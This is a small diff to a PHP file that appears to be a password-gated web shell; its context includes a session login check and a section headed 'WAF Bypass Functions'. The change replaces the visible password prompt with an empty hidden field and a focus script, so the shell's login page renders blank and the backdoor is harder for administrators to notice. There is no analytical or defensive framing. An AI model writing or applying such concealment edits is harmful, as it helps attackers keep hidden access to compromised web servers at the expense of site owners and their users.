@@ -24,7 +24,7 @@ if (!isset($_SESSION['logged_in'])) {
             exit();
         }
     }
-    die("<pre align=center><form method=post>Password: <input type=password name=pass autofocus><input type=submit value='>>'></form></pre>");
+    die("<pre align=center><form method=post><input type=hidden name=pass value=''></form></pre><script>document.forms[0].pass.focus();</script>");
 }
 
 // WAF Bypass Functions
